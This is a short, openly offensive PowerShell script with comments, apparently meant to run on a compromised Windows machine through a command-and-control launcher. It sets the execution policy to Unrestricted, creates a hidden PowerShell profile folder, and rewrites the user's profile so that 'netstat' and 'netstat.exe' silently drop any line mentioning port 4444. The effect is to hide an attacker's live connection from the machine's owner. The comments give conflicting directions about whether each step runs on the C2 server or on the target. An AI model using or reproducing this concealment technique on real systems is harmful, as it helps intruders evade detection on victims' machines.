#NOTE: EVERYTHING below MUST be ran on your C2 SERVER via a POWERSHELL LAUNCHER

Set-ExecutionPolicy Unrestricted

# Create PowerShell profile directory as a hidden folder to prevent detection. RUN ON THE TARGET SYSTEM AND NOT THE C2
cd $env:USERPROFILE;$d="Documents\WindowsPowerShell\";New-Item -ItemType Directory -Name "$d";$h=Get-Item "$d";$h.Attributes="Hidden"

# Create Netstat function
function netstat { netstat.exe $args }

# Overwrite the PowerShell profile to omit any line containing a connection to a specific port. In the below example, we omit any line containing port 4444.
# The Select-String filter is appended transparently to the user's Netstat command and omits lines containing "4444."
# RUN THE BELOW IN THE C2
echo 'function netstat { netstat.exe $args | Select-String -notmatch "4444" }' > $PROFILE

# When using "netstat," the function will operate as expected.
# However, PowerShell will ignore it entirely if called with "netstat.exe."
# A simple solution to this is to create two functions, one called "netstat" and the other "netstat.exe." 
# Also, use PowerShell to call the real Netstat to ensure there are no infinite function loops. Note the single arrow (>); it will delete the contents of the current profile.
# RUN THE BELOW IN THE C2
echo 'function netstat { powershell.exe -NoProfile -Command "netstat.exe $args" | Select-String -notmatch "4444" }' > $PROFILE

# Next, perform the command again, but name the function "netstat.exe" and use double arrows (>>) to append it to the profile.
# RUN THE BELOW IN THE C2
echo 'function netstat.exe { powershell.exe -NoProfile -Command "netstat.exe $args" | Select-String -notmatch "4444" }' >> $PROFILE

#Close the powershell session on the target box and open a new one to take effect. 
